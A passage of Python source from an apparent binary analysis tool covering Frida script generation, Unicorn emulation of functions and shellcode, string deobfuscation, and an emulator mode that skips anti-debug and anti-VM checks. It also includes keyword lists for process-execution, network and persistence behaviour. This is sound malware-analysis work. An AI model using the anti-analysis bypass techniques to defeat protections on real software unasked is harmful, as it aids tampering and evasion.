                    "name": "attack_surface_hooks",
                    "category": "attack_surface",
                    "description": f"Hook {len(entry_points)} entry points and {len(dangerous_funcs)} dangerous functions",
                    "code": entry_script
                })
        
        # Categorize scripts
        for script in scripts["scripts"]:
            cat = script["category"]
            if cat not in scripts["categories"]:
                scripts["categories"][cat] = []
            scripts["categories"][cat].append(script["name"])
        
        scripts["total_scripts"] = len(scripts["scripts"])
        
    except Exception as e:
        logger.error(f"Frida script generation failed: {e}")
        scripts["error"] = str(e)
    
    # =========================================================================
    # ADD PROTECTION DETECTION FLAGS (Like APK analyzer)
    # =========================================================================
    scripts["anti_debug_detected"] = anti_debug_detected
    scripts["anti_debug_patterns_found"] = anti_debug_patterns_found[:10]  # Top 10
    scripts["anti_vm_detected"] = anti_vm_detected
    scripts["anti_vm_patterns_found"] = anti_vm_patterns_found[:10]
    scripts["anti_tampering_detected"] = anti_tampering_detected
    scripts["anti_tampering_patterns_found"] = anti_tampering_patterns_found[:10]
    scripts["packing_detected"] = packing_detected
    scripts["code_integrity_detected"] = code_integrity_detected
    
    # Generate suggested test cases based on detections
    suggested_tests = []
    if anti_debug_detected:
        suggested_tests.append("Anti-debugging detected - use anti_debug_bypass.js Frida script")
    if anti_vm_detected:
        suggested_tests.append("VM detection found - test on physical hardware or use VM bypass")
    if anti_tampering_detected:
        suggested_tests.append("Integrity checks found - monitor with Frida before patching")
    if packing_detected:
        suggested_tests.append("Packed/obfuscated - unpack first or analyze at runtime")
    if verified_findings:
        suggested_tests.append("Hook vulnerable functions with vulnerability_hooks.js")
    suggested_tests.append("Trace function calls with function_tracer.js")
    suggested_tests.append("Monitor crypto operations with crypto_hooks.js")
    suggested_tests.append("Capture network traffic with network_hooks.js")
    
    scripts["suggested_test_cases"] = suggested_tests
    
    # Frida command templates
    scripts["frida_spawn_command"] = f"frida -f {binary_name} -l <script.js> --no-pause"
    scripts["frida_attach_command"] = f"frida -n {binary_name} -l <script.js>"
    
    # Protection summary for UI
    scripts["protection_summary"] = {
        "anti_debug": {
            "detected": anti_debug_detected,
            "count": len(anti_debug_patterns_found),
            "techniques": [p['pattern'] for p in anti_debug_patterns_found[:5]]
        },
        "anti_vm": {
            "detected": anti_vm_detected,
            "count": len(anti_vm_patterns_found),
            "techniques": [p['pattern'] for p in anti_vm_patterns_found[:5]]
        },
        "anti_tampering": {
            "detected": anti_tampering_detected,
            "count": len(anti_tampering_patterns_found),
            "techniques": [p['pattern'] for p in anti_tampering_patterns_found[:5]]
        },
        "packing": {
            "detected": packing_detected,
            "from_obfuscation_analysis": bool(obfuscation_result)
        },
        "code_integrity": {
            "detected": code_integrity_detected
        }
    }
    
    return scripts


# =============================================================================
# PART 9: UNICORN EMULATION FOR DYNAMIC ANALYSIS
# =============================================================================

def emulate_binary_function(
    binary_data: bytes,
    architecture: str,
    function_address: int,
    function_size: int = 0x1000,
    base_address: int = 0x400000,
    stack_address: int = 0x7ffe0000,
    stack_size: int = 0x10000,
    timeout_ms: int = 5000,
    max_instructions: int = 10000,
    initial_registers: Optional[Dict[str, int]] = None,
    memory_regions: Optional[List[Dict[str, Any]]] = None
) -> Dict[str, Any]:
    """
    Emulate a binary function using Unicorn engine.
    
    This enables dynamic analysis without executing the actual binary:
    - Trace execution flow
    - Deobfuscate strings at runtime
    - Understand function behavior
    - Extract decrypted data
    
    Args:
        binary_data: Raw binary content
        architecture: Target architecture (x86, x64, arm, arm64, mips)
        function_address: Virtual address of the function to emulate
        function_size: Size of code to map (default 4KB)
        base_address: Base address to load binary
        stack_address: Stack base address
        stack_size: Stack size
        timeout_ms: Emulation timeout in milliseconds
        max_instructions: Maximum instructions to execute
        initial_registers: Optional initial register values
        memory_regions: Additional memory regions to map
        
    Returns:
        Emulation result with traces, memory writes, and final state
    """
    result = {
        "success": False,
        "architecture": architecture,
        "function_address": hex(function_address),
        "instructions_executed": 0,
        "execution_trace": [],
        "memory_writes": [],
        "memory_reads": [],
        "strings_found": [],
        "final_registers": {},
        "error": None,
        "emulation_time_ms": 0,
    }
    
    try:
        from unicorn import Uc, UC_HOOK_CODE, UC_HOOK_MEM_WRITE, UC_HOOK_MEM_READ
        from unicorn import UC_ARCH_X86, UC_ARCH_ARM, UC_ARCH_ARM64, UC_ARCH_MIPS
        from unicorn import UC_MODE_32, UC_MODE_64, UC_MODE_ARM, UC_MODE_LITTLE_ENDIAN
        from unicorn.x86_const import (
            UC_X86_REG_RSP, UC_X86_REG_RBP, UC_X86_REG_RAX, UC_X86_REG_RBX,
            UC_X86_REG_RCX, UC_X86_REG_RDX, UC_X86_REG_RSI, UC_X86_REG_RDI,
            UC_X86_REG_RIP, UC_X86_REG_R8, UC_X86_REG_R9,
            UC_X86_REG_ESP, UC_X86_REG_EBP, UC_X86_REG_EAX, UC_X86_REG_EBX,
            UC_X86_REG_ECX, UC_X86_REG_EDX, UC_X86_REG_ESI, UC_X86_REG_EDI,
            UC_X86_REG_EIP
        )
        from unicorn.arm_const import UC_ARM_REG_SP
        from unicorn.arm64_const import UC_ARM64_REG_SP
        from unicorn.mips_const import UC_MIPS_REG_SP
        import time
        
        start_time = time.time()
        
        # Map architecture to Unicorn constants
        arch_map = {
            "x86": (UC_ARCH_X86, UC_MODE_32),
            "x64": (UC_ARCH_X86, UC_MODE_64),
            "i386": (UC_ARCH_X86, UC_MODE_32),
            "amd64": (UC_ARCH_X86, UC_MODE_64),
            "arm": (UC_ARCH_ARM, UC_MODE_ARM),
            "arm64": (UC_ARCH_ARM64, UC_MODE_LITTLE_ENDIAN),
            "aarch64": (UC_ARCH_ARM64, UC_MODE_LITTLE_ENDIAN),
            "mips": (UC_ARCH_MIPS, UC_MODE_32 | UC_MODE_LITTLE_ENDIAN),
            "mips64": (UC_ARCH_MIPS, UC_MODE_64 | UC_MODE_LITTLE_ENDIAN),
        }
        
        arch_lower = architecture.lower()
        if arch_lower not in arch_map:
            result["error"] = f"Unsupported architecture: {architecture}"
            return result
        
        uc_arch, uc_mode = arch_map[arch_lower]
        
        # Initialize emulator
        emu = Uc(uc_arch, uc_mode)
        
        # Map memory for binary code
        code_size = max(function_size, 0x10000)  # At least 64KB
        emu.mem_map(base_address, code_size)
        
        # Write binary data (or portion of it)
        if len(binary_data) > code_size:
            emu.mem_write(base_address, binary_data[:code_size])
        else:
            emu.mem_write(base_address, binary_data)
        
        # Map stack
        emu.mem_map(stack_address, stack_size)
        
        # Map additional memory regions if provided
        if memory_regions:
            for region in memory_regions:
                addr = region.get("address", 0)
                size = region.get("size", 0x1000)
                data = region.get("data", b"")
                try:
                    emu.mem_map(addr, size)
                    if data:
                        emu.mem_write(addr, data)
                except Exception:
                    pass  # Region might already be mapped
        
        # Set up registers based on architecture
        if "x86" in arch_lower or "i386" in arch_lower or "amd64" in arch_lower or "x64" in arch_lower:
            # x86/x64 setup
            if uc_mode == UC_MODE_64:
                emu.reg_write(UC_X86_REG_RSP, stack_address + stack_size - 0x100)
                emu.reg_write(UC_X86_REG_RBP, stack_address + stack_size - 0x100)
            else:
                emu.reg_write(UC_X86_REG_ESP, stack_address + stack_size - 0x100)
                emu.reg_write(UC_X86_REG_EBP, stack_address + stack_size - 0x100)
        elif "arm64" in arch_lower or "aarch64" in arch_lower:
            # ARM64 setup
            emu.reg_write(UC_ARM64_REG_SP, stack_address + stack_size - 0x100)
        elif "arm" in arch_lower:
            # ARM setup
            emu.reg_write(UC_ARM_REG_SP, stack_address + stack_size - 0x100)
        elif "mips" in arch_lower:
            # MIPS setup
            emu.reg_write(UC_MIPS_REG_SP, stack_address + stack_size - 0x100)
        
        # Apply custom initial registers
        if initial_registers:
            for reg_name, value in initial_registers.items():
                try:
                    reg_const = globals().get(f"UC_X86_REG_{reg_name.upper()}")
                    if reg_const:
                        emu.reg_write(reg_const, value)
                except Exception:
                    pass
        
        # Instruction tracing
        instruction_count = [0]
        trace = []
        
        def hook_code(uc, address, size, user_data):
            instruction_count[0] += 1
            if instruction_count[0] <= 500:  # Limit trace size
                trace.append({
                    "address": hex(address),
                    "size": size,
                    "count": instruction_count[0]
                })
            if instruction_count[0] >= max_instructions:
                uc.emu_stop()
        
        emu.hook_add(UC_HOOK_CODE, hook_code)
        
        # Memory write tracing
        mem_writes = []
        
        def hook_mem_write(uc, access, address, size, value, user_data):
            if len(mem_writes) < 200:  # Limit
                mem_writes.append({
                    "address": hex(address),
                    "size": size,
                    "value": hex(value) if value else "0"
                })
        
        emu.hook_add(UC_HOOK_MEM_WRITE, hook_mem_write)
        
        # Memory read tracing
        mem_reads = []
        
        def hook_mem_read(uc, access, address, size, value, user_data):
            if len(mem_reads) < 200:
                mem_reads.append({
                    "address": hex(address),
                    "size": size
                })
        
        emu.hook_add(UC_HOOK_MEM_READ, hook_mem_read)
        
        # Start emulation
        end_address = function_address + function_size
        try:
            emu.emu_start(function_address, end_address, timeout=timeout_ms * 1000)
        except Exception as emu_err:
            result["error"] = f"Emulation stopped: {str(emu_err)}"
        
        # Collect results
        result["success"] = True
        result["instructions_executed"] = instruction_count[0]
        result["execution_trace"] = trace[:100]  # First 100 instructions
        result["memory_writes"] = mem_writes
        result["memory_reads"] = mem_reads[:50]
        
        # Read final register state
        if "x86" in arch_lower or "x64" in arch_lower:
            if uc_mode == UC_MODE_64:
                result["final_registers"] = {
                    "RAX": hex(emu.reg_read(UC_X86_REG_RAX)),
                    "RBX": hex(emu.reg_read(UC_X86_REG_RBX)),
                    "RCX": hex(emu.reg_read(UC_X86_REG_RCX)),
                    "RDX": hex(emu.reg_read(UC_X86_REG_RDX)),
                    "RSP": hex(emu.reg_read(UC_X86_REG_RSP)),
                    "RBP": hex(emu.reg_read(UC_X86_REG_RBP)),
                    "RSI": hex(emu.reg_read(UC_X86_REG_RSI)),
                    "RDI": hex(emu.reg_read(UC_X86_REG_RDI)),
                    "RIP": hex(emu.reg_read(UC_X86_REG_RIP)),
                }
            else:
                result["final_registers"] = {
                    "EAX": hex(emu.reg_read(UC_X86_REG_EAX)),
                    "EBX": hex(emu.reg_read(UC_X86_REG_EBX)),
                    "ECX": hex(emu.reg_read(UC_X86_REG_ECX)),
                    "EDX": hex(emu.reg_read(UC_X86_REG_EDX)),
                    "ESP": hex(emu.reg_read(UC_X86_REG_ESP)),
                    "EBP": hex(emu.reg_read(UC_X86_REG_EBP)),
                    "ESI": hex(emu.reg_read(UC_X86_REG_ESI)),
                    "EDI": hex(emu.reg_read(UC_X86_REG_EDI)),
                    "EIP": hex(emu.reg_read(UC_X86_REG_EIP)),
                }
        
        # Try to extract strings from memory writes
        strings_found = []
        for write in mem_writes:
            try:
                addr = int(write["address"], 16)
                data = emu.mem_read(addr, 256)
                # Look for null-terminated strings
                null_idx = data.find(b'\x00')
                if null_idx > 3:
                    try:
                        s = data[:null_idx].decode('utf-8', errors='ignore')
                        if len(s) >= 4 and s.isprintable():
                            strings_found.append({
                                "address": write["address"],
                                "value": s
                            })
                    except:
                        pass
            except:
                pass
        
        result["strings_found"] = strings_found[:50]
        result["emulation_time_ms"] = int((time.time() - start_time) * 1000)
        
    except ImportError:
        result["error"] = "Unicorn engine not installed. Install with: pip install unicorn"
    except Exception as e:
        result["error"] = str(e)
        logger.error(f"Emulation failed: {e}")
    
    return result


def emulate_deobfuscation(
    binary_data: bytes,
    architecture: str,
    decrypt_functions: List[Dict[str, Any]],
    encrypted_strings: List[Dict[str, Any]],
    base_address: int = 0x400000
) -> Dict[str, Any]:
    """
    Attempt to deobfuscate strings by emulating decryption functions.
    
    Args:
        binary_data: Raw binary content
        architecture: Target architecture
        decrypt_functions: List of suspected decryption functions with addresses
        encrypted_strings: List of encrypted strings with addresses
        base_address: Base address of binary
        
    Returns:
        Deobfuscation results with decrypted strings
    """
    result = {
        "success": False,
        "decrypted_strings": [],
        "functions_tried": 0,
        "successful_decryptions": 0,
        "errors": [],
    }
    
    try:
        from unicorn import Uc, UC_HOOK_CODE
        from unicorn import UC_ARCH_X86, UC_MODE_32, UC_MODE_64
        from unicorn.x86_const import (
            UC_X86_REG_RSP, UC_X86_REG_RCX, UC_X86_REG_RDX, UC_X86_REG_R8,
            UC_X86_REG_ESP
        )
        
        for func in decrypt_functions[:10]:  # Limit to 10 functions
            func_addr = func.get("address", 0)
            func_name = func.get("name", "unknown")
            result["functions_tried"] += 1
            
            for enc_str in encrypted_strings[:20]:  # Limit to 20 strings
                str_addr = enc_str.get("address", 0)
                str_data = enc_str.get("data", b"")
                
                try:
                    # Set up emulator for each attempt
                    is_64bit = "64" in architecture.lower()
                    uc_mode = UC_MODE_64 if is_64bit else UC_MODE_32
                    emu = Uc(UC_ARCH_X86, uc_mode)
                    
                    # Map memory
                    emu.mem_map(base_address, 0x100000)  # 1MB for code
                    emu.mem_write(base_address, binary_data[:0x100000] if len(binary_data) > 0x100000 else binary_data)
                    
                    # Map data region for encrypted string
                    data_addr = 0x600000
                    emu.mem_map(data_addr, 0x10000)
                    if isinstance(str_data, bytes):
                        emu.mem_write(data_addr, str_data)
                    
                    # Map output buffer
                    output_addr = 0x700000
                    emu.mem_map(output_addr, 0x1000)
                    
                    # Stack
                    stack_addr = 0x7ffe0000
                    emu.mem_map(stack_addr, 0x10000)
                    
                    if is_64bit:
                        # x64 calling convention: RCX, RDX, R8, R9
                        emu.reg_write(UC_X86_REG_RSP, stack_addr + 0x8000)
                        emu.reg_write(UC_X86_REG_RCX, data_addr)  # Encrypted data
                        emu.reg_write(UC_X86_REG_RDX, output_addr)  # Output buffer
                        emu.reg_write(UC_X86_REG_R8, len(str_data) if isinstance(str_data, bytes) else 0)
                    else:
                        # x86 cdecl: push args right-to-left
                        emu.reg_write(UC_X86_REG_ESP, stack_addr + 0x8000)
                        # Push arguments to stack
                        esp = stack_addr + 0x8000
                        emu.mem_write(esp, data_addr.to_bytes(4, 'little'))
                        emu.mem_write(esp + 4, output_addr.to_bytes(4, 'little'))
                    
                    # Limit execution
                    max_instr = [0]
                    def hook_limit(uc, addr, size, user_data):
                        max_instr[0] += 1
                        if max_instr[0] > 5000:
                            uc.emu_stop()
                    emu.hook_add(UC_HOOK_CODE, hook_limit)
                    
                    # Run emulation
                    emu.emu_start(func_addr, func_addr + 0x500, timeout=2000000)
                    
                    # Read output buffer
                    output = emu.mem_read(output_addr, 256)
                    null_idx = output.find(b'\x00')
                    if null_idx > 0:
                        decrypted = output[:null_idx].decode('utf-8', errors='ignore')
                        if len(decrypted) >= 4 and decrypted.isprintable():
                            result["decrypted_strings"].append({
                                "original_address": hex(str_addr),
                                "decrypt_function": func_name,
                                "decrypted_value": decrypted
                            })
                            result["successful_decryptions"] += 1
                    
                except Exception as e:
                    result["errors"].append(f"{func_name}: {str(e)}")
                    continue
        
        result["success"] = result["successful_decryptions"] > 0
        
    except ImportError:
        result["errors"].append("Unicorn engine not installed")
    except Exception as e:
        result["errors"].append(str(e))
    
    return result


def run_binary_emulation_analysis(
    binary_data: bytes,
    static_result: Optional[Any] = None,
    ghidra_result: Optional[Dict[str, Any]] = None
) -> Dict[str, Any]:
    """
    Run comprehensive emulation-based analysis on a binary.
    
    Performs:
    1. Entry point emulation
    2. Suspicious function emulation (crypto, string decode, etc.)
    3. String deobfuscation attempts
    4. Behavior tracing
    
    Args:
        binary_data: Raw binary content
        static_result: Static analysis result (for architecture info)
        ghidra_result: Ghidra decompilation (for function addresses)
        
    Returns:
        Comprehensive emulation analysis result
    """
    result = {
        "emulation_available": False,
        "architecture": "unknown",
        "entry_point_trace": None,
        "function_traces": [],
        "deobfuscated_strings": [],
        "runtime_behaviors": [],
        "api_calls_detected": [],
        "error": None,
    }
    
    try:
        # Try importing unicorn to check availability
        from unicorn import Uc
        result["emulation_available"] = True
    except ImportError:
        result["error"] = "Unicorn engine not available"
        return result
    
    # Get architecture from static analysis
    architecture = "x86"
    entry_point = 0x401000
    base_address = 0x400000
    
    if static_result:
        meta = getattr(static_result, 'metadata', None)
        if meta:
            arch = getattr(meta, 'architecture', '').lower()
            if 'x64' in arch or 'amd64' in arch or '64-bit' in arch:
                architecture = "x64"
            elif 'arm64' in arch or 'aarch64' in arch:
                architecture = "arm64"
            elif 'arm' in arch:
                architecture = "arm"
            elif 'mips' in arch:
                architecture = "mips"
            
            # Get entry point if available
            ep = getattr(meta, 'entry_point', 0)
            if ep:
                entry_point = ep
    
    result["architecture"] = architecture
    
    # 1. Emulate from entry point (limited)
    try:
        entry_trace = emulate_binary_function(
            binary_data=binary_data,
            architecture=architecture,
            function_address=entry_point,
            function_size=0x500,
            base_address=base_address,
            max_instructions=500,
            timeout_ms=2000
        )
        result["entry_point_trace"] = {
            "address": hex(entry_point),
            "instructions": entry_trace.get("instructions_executed", 0),
            "strings_found": entry_trace.get("strings_found", [])[:10],
            "success": entry_trace.get("success", False)
        }
    except Exception as e:
        result["entry_point_trace"] = {"error": str(e)}
    
    # 2. Emulate suspicious functions from Ghidra
    if ghidra_result:
        functions = ghidra_result.get("functions", [])
        
        # Find interesting functions to emulate
        interesting_patterns = ['decrypt', 'decode', 'deobfuscate', 'xor', 'unpack', 
                               'decompress', 'getstring', 'loadstring', 'resolve']
        
        for func in functions[:50]:
            func_name = func.get("name", "").lower()
            func_addr = func.get("address", 0)
            
            if any(p in func_name for p in interesting_patterns) and func_addr:
                try:
                    # Parse address
                    if isinstance(func_addr, str):
                        func_addr = int(func_addr, 16) if func_addr.startswith('0x') else int(func_addr)
                    
                    trace = emulate_binary_function(
                        binary_data=binary_data,
                        architecture=architecture,
                        function_address=func_addr,
                        function_size=0x200,
                        base_address=base_address,
                        max_instructions=1000,
                        timeout_ms=1000
                    )
                    
                    if trace.get("success") and trace.get("instructions_executed", 0) > 10:
                        result["function_traces"].append({
                            "name": func.get("name"),
                            "address": hex(func_addr),
                            "instructions": trace.get("instructions_executed"),
                            "memory_writes": len(trace.get("memory_writes", [])),
                            "strings_found": trace.get("strings_found", [])[:5]
                        })
                        
                        # Collect any strings found
                        for s in trace.get("strings_found", []):
                            result["deobfuscated_strings"].append({
                                "source_function": func.get("name"),
                                "address": s.get("address"),
                                "value": s.get("value")
                            })
                    
                except Exception:
                    continue
            
            if len(result["function_traces"]) >= 10:
                break
    
    # 3. Detect runtime behaviors based on traces
    behaviors = []
    
    all_strings = []
    if result.get("entry_point_trace"):
        all_strings.extend(result["entry_point_trace"].get("strings_found", []))
    for ft in result.get("function_traces", []):
        all_strings.extend(ft.get("strings_found", []))
    
    string_values = [s.get("value", "").lower() for s in all_strings]
    combined = " ".join(string_values)
    
    behavior_patterns = [
        ("network", ["http", "https", "socket", "connect", "send", "recv", "dns"]),
        ("file_access", ["createfile", "writefile", "readfile", "fopen", "fwrite"]),
        ("registry", ["regopen", "regset", "regquery", "hkey_"]),
        ("process", ["createprocess", "shellexecute", "winexec", "system("]),
        ("crypto", ["encrypt", "decrypt", "aes", "rsa", "cipher", "hash"]),
        ("persistence", ["run", "startup", "schedule", "service"]),
    ]
    
    for behavior, patterns in behavior_patterns:
        if any(p in combined for p in patterns):
            behaviors.append(behavior)
    
    result["runtime_behaviors"] = behaviors
    
    return result


# =============================================================================
# PART 9B: ENHANCED EMULATION FEATURES
# =============================================================================

def emulate_with_api_hooks(
    binary_data: bytes,
    architecture: str,
    function_address: int,
    base_address: int = 0x400000,
    timeout_ms: int = 5000,
    max_instructions: int = 10000,
    bypass_anti_analysis: bool = True
) -> Dict[str, Any]:
    """
    Enhanced emulation with Windows/Linux API hooking and anti-analysis bypass.
    
    Features:
    - Hooks common Windows APIs and returns safe values
    - Auto-bypasses anti-debug/anti-VM checks
    - Tracks API call sequences
    - Captures API arguments
    
    Args:
        binary_data: Raw binary content
        architecture: Target architecture
        function_address: Function to emulate
        base_address: Base address
        timeout_ms: Timeout
        max_instructions: Max instructions
        bypass_anti_analysis: Auto-bypass anti-debug/VM checks
        
    Returns:
        Enhanced emulation result with API call traces
    """
    result = {
        "success": False,
        "api_calls": [],
        "bypassed_checks": [],
        "strings_decrypted": [],
        "memory_allocations": [],
        "file_operations": [],
        "registry_operations": [],
        "network_operations": [],
        "crypto_operations": [],
        "execution_trace": [],
        "error": None,
    }
    
    try:
        from unicorn import Uc, UC_HOOK_CODE, UC_HOOK_MEM_WRITE, UC_HOOK_INTR
        from unicorn import UC_ARCH_X86, UC_MODE_32, UC_MODE_64
        from unicorn.x86_const import (
            UC_X86_REG_RSP, UC_X86_REG_RBP, UC_X86_REG_RAX, UC_X86_REG_RBX,
            UC_X86_REG_RCX, UC_X86_REG_RDX, UC_X86_REG_RSI, UC_X86_REG_RDI,
            UC_X86_REG_RIP, UC_X86_REG_R8, UC_X86_REG_R9,
            UC_X86_REG_ESP, UC_X86_REG_EBP, UC_X86_REG_EAX, UC_X86_REG_EBX,
            UC_X86_REG_ECX, UC_X86_REG_EDX, UC_X86_REG_ESI, UC_X86_REG_EDI,
            UC_X86_REG_EIP
        )
        
        is_64bit = "64" in architecture.lower() or "amd64" in architecture.lower()
        uc_mode = UC_MODE_64 if is_64bit else UC_MODE_32
        emu = Uc(UC_ARCH_X86, uc_mode)
        
        # Map memory regions
        code_size = max(len(binary_data), 0x100000)
        emu.mem_map(base_address, code_size)
        emu.mem_write(base_address, binary_data[:code_size] if len(binary_data) > code_size else binary_data)
        
        # Stack
        stack_addr = 0x7ffe0000
        emu.mem_map(stack_addr, 0x10000)
        
        # Heap for allocations
        heap_addr = 0x10000000
        emu.mem_map(heap_addr, 0x100000)
        heap_ptr = [heap_addr]  # Mutable for closure
        
        # IAT/API region
        iat_addr = 0x600000
        emu.mem_map(iat_addr, 0x10000)
        
        # Set up stack
        if is_64bit:
            emu.reg_write(UC_X86_REG_RSP, stack_addr + 0x8000)
            emu.reg_write(UC_X86_REG_RBP, stack_addr + 0x8000)
        else:
            emu.reg_write(UC_X86_REG_ESP, stack_addr + 0x8000)
            emu.reg_write(UC_X86_REG_EBP, stack_addr + 0x8000)
        
        # Windows API hooks with fake returns
        api_hooks = {
            # Anti-debug APIs - return "not debugged"
            "IsDebuggerPresent": {"return": 0, "category": "anti_debug"},
            "CheckRemoteDebuggerPresent": {"return": 0, "category": "anti_debug"},
            "NtQueryInformationProcess": {"return": 0, "category": "anti_debug"},
            "GetTickCount": {"return": 0x12345678, "category": "anti_debug"},
            "QueryPerformanceCounter": {"return": 1, "category": "anti_debug"},
            
            # Memory APIs - track allocations
            "VirtualAlloc": {"return": heap_ptr, "category": "memory", "alloc": True},
            "HeapAlloc": {"return": heap_ptr, "category": "memory", "alloc": True},
            "malloc": {"return": heap_ptr, "category": "memory", "alloc": True},
            "GlobalAlloc": {"return": heap_ptr, "category": "memory", "alloc": True},
            
            # File APIs - log operations
            "CreateFileA": {"return": 0x100, "category": "file"},
            "CreateFileW": {"return": 0x100, "category": "file"},
            "ReadFile": {"return": 1, "category": "file"},
            "WriteFile": {"return": 1, "category": "file"},
            
            # Registry APIs - log operations
            "RegOpenKeyExA": {"return": 0, "category": "registry"},
            "RegOpenKeyExW": {"return": 0, "category": "registry"},
            "RegQueryValueExA": {"return": 0, "category": "registry"},
            "RegSetValueExA": {"return": 0, "category": "registry"},
            
            # Network APIs - log operations
            "socket": {"return": 0x200, "category": "network"},
            "connect": {"return": 0, "category": "network"},
            "send": {"return": 100, "category": "network"},
            "recv": {"return": 100, "category": "network"},
            "WSAStartup": {"return": 0, "category": "network"},
            
            # Crypto APIs - track usage
            "CryptAcquireContextA": {"return": 1, "category": "crypto"},
            "CryptEncrypt": {"return": 1, "category": "crypto"},
            "CryptDecrypt": {"return": 1, "category": "crypto"},
            "BCryptEncrypt": {"return": 0, "category": "crypto"},
            "BCryptDecrypt": {"return": 0, "category": "crypto"},
            
            # String APIs
            "GetModuleHandleA": {"return": base_address, "category": "module"},
            "GetProcAddress": {"return": iat_addr, "category": "module"},
            "LoadLibraryA": {"return": base_address + 0x10000, "category": "module"},
        }
        
        instruction_count = [0]
        api_call_log = []
        bypassed = []
        
        def hook_code(uc, address, size, user_data):
            nonlocal instruction_count, api_call_log, bypassed
            instruction_count[0] += 1
            
            # Read instruction bytes
            try:
                code = uc.mem_read(address, size)
                
                # Detect CALL instruction (0xE8 or 0xFF)
                if code[0] == 0xE8 or (code[0] == 0xFF and len(code) > 1):
                    # This is a call - check if it's to a known API region
                    if iat_addr <= address < iat_addr + 0x10000:
                        # Simulate API return
                        api_call_log.append({
                            "address": hex(address),
                            "instruction": instruction_count[0]
                        })
                
                # Detect common anti-debug patterns
                if bypass_anti_analysis:
                    # INT 3 (0xCC) - debugger trap
                    if code[0] == 0xCC:
                        bypassed.append({"type": "int3", "address": hex(address)})
                        # Skip it
                        if is_64bit:
                            uc.reg_write(UC_X86_REG_RIP, address + 1)
                        else:
                            uc.reg_write(UC_X86_REG_EIP, address + 1)
                    
                    # INT 2D (0xCD 0x2D) - kernel debugger check
                    if len(code) >= 2 and code[0] == 0xCD and code[1] == 0x2D:
                        bypassed.append({"type": "int2d", "address": hex(address)})
                        if is_64bit:
                            uc.reg_write(UC_X86_REG_RIP, address + 2)
                        else:
                            uc.reg_write(UC_X86_REG_EIP, address + 2)
                    
                    # RDTSC (0x0F 0x31) - timing check
                    if len(code) >= 2 and code[0] == 0x0F and code[1] == 0x31:
                        bypassed.append({"type": "rdtsc", "address": hex(address)})
                        # Set consistent timing
                        if is_64bit:
                            uc.reg_write(UC_X86_REG_RAX, 0x12345678)
                            uc.reg_write(UC_X86_REG_RDX, 0x00000001)
                        else:
                            uc.reg_write(UC_X86_REG_EAX, 0x12345678)
                            uc.reg_write(UC_X86_REG_EDX, 0x00000001)
                    
                    # CPUID (0x0F 0xA2) - VM detection
                    if len(code) >= 2 and code[0] == 0x0F and code[1] == 0xA2:
                        bypassed.append({"type": "cpuid", "address": hex(address)})
                        # Return non-VM values
                        if is_64bit:
                            uc.reg_write(UC_X86_REG_RAX, 0x00000001)
                            uc.reg_write(UC_X86_REG_RBX, 0x756E6547)  # "Genu"
                            uc.reg_write(UC_X86_REG_RCX, 0x6C65746E)  # "ntel"
                            uc.reg_write(UC_X86_REG_RDX, 0x49656E69)  # "ineI"
                        else:
                            uc.reg_write(UC_X86_REG_EAX, 0x00000001)
                            uc.reg_write(UC_X86_REG_EBX, 0x756E6547)
                            uc.reg_write(UC_X86_REG_ECX, 0x6C65746E)
                            uc.reg_write(UC_X86_REG_EDX, 0x49656E69)
                
            except Exception:
                pass
            
            if instruction_count[0] >= max_instructions:
                uc.emu_stop()
        
        emu.hook_add(UC_HOOK_CODE, hook_code)
        
        # Memory write tracking for string decryption
        decrypted_strings = []
        
        def hook_mem_write(uc, access, address, size, value, user_data):
            # Check if this looks like string data being written
            if heap_addr <= address < heap_addr + 0x100000:
                try:
                    # Read surrounding memory to find strings
                    data = uc.mem_read(address, min(256, heap_addr + 0x100000 - address))
                    null_idx = data.find(b'\x00')
                    if 4 <= null_idx <= 200:
                        try:
                            s = data[:null_idx].decode('utf-8', errors='ignore')
                            if s.isprintable() and len(s) >= 4:
                                decrypted_strings.append({
                                    "address": hex(address),
                                    "value": s,
                                    "instruction": instruction_count[0]
                                })
                        except:
                            pass
                except:
                    pass
        
        emu.hook_add(UC_HOOK_MEM_WRITE, hook_mem_write)
        
        # Run emulation
        try:
            emu.emu_start(function_address, function_address + 0x10000, timeout=timeout_ms * 1000)
        except Exception as e:
            result["error"] = f"Emulation stopped: {str(e)}"
        
        result["success"] = True
        result["api_calls"] = api_call_log
        result["bypassed_checks"] = bypassed
        result["strings_decrypted"] = decrypted_strings[:50]
        result["instructions_executed"] = instruction_count[0]
        
    except ImportError:
        result["error"] = "Unicorn not installed"
    except Exception as e:
        result["error"] = str(e)
    
    return result


def emulate_shellcode(
    shellcode: bytes,
    architecture: str = "x86",
    base_address: int = 0x10000,
    max_instructions: int = 5000,
    timeout_ms: int = 3000
) -> Dict[str, Any]:
    """
    Emulate raw shellcode to analyze its behavior.
    
    Features:
    - Direct shellcode execution
    - API call detection via common patterns
    - String extraction from decryption stubs
    - Egg hunter detection
    
    Args:
        shellcode: Raw shellcode bytes
        architecture: x86 or x64
        base_address: Where to load shellcode
        max_instructions: Limit
        timeout_ms: Timeout
        
    Returns:
        Shellcode analysis result
    """
    result = {
        "success": False,
        "architecture": architecture,
        "shellcode_size": len(shellcode),
        "execution_trace": [],
        "api_hashes": [],  # Detected API hash lookups
        "strings_found": [],
        "decoded_strings": [],
        "xor_keys_found": [],
        "egg_patterns": [],
        "syscalls": [],
        "behavior_indicators": [],
        "error": None,
    }
    
    try:
        from unicorn import Uc, UC_HOOK_CODE, UC_HOOK_MEM_WRITE
        from unicorn import UC_ARCH_X86, UC_MODE_32, UC_MODE_64
        from unicorn.x86_const import (
            UC_X86_REG_RSP, UC_X86_REG_RAX, UC_X86_REG_RBX, UC_X86_REG_RCX,
            UC_X86_REG_RDX, UC_X86_REG_RIP, UC_X86_REG_ESP, UC_X86_REG_EAX,
            UC_X86_REG_EBX, UC_X86_REG_ECX, UC_X86_REG_EDX, UC_X86_REG_EIP
        )
        
        is_64bit = "64" in architecture.lower()
        uc_mode = UC_MODE_64 if is_64bit else UC_MODE_32
        emu = Uc(UC_ARCH_X86, uc_mode)
        
        # Memory layout
        code_size = max(len(shellcode) + 0x1000, 0x10000)
        emu.mem_map(base_address, code_size)
        emu.mem_write(base_address, shellcode)
        
        # Stack
        stack_addr = 0x7ffe0000
        emu.mem_map(stack_addr, 0x10000)
        
        # Data segment for decoded strings
        data_addr = 0x20000000
        emu.mem_map(data_addr, 0x10000)
        
        if is_64bit:
            emu.reg_write(UC_X86_REG_RSP, stack_addr + 0x8000)
        else:
            emu.reg_write(UC_X86_REG_ESP, stack_addr + 0x8000)
        
        # Common API hashes (used by shellcode loaders)
        known_api_hashes = {
            0x0726774C: "kernel32.dll!LoadLibraryA",
